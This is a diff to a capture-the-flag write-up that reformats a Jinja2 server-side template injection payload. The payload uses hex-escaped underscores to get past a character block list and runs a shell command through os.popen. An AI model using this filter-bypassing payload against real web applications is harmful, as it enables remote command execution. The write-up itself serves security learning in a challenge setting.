@@ -21,7 +21,7 @@ I made a cool website where you can announce whatever you want! I read about inp
 Played around with different patterns to see if I could identify the block list, characters such as [], () and ' were filtered under specific combinations.
 
 After some quick trial and error managed to find the payload:
-```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}```
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 
 This payload bypasses the filter and is able to print the flag.
 ![alt text](image-3.png)
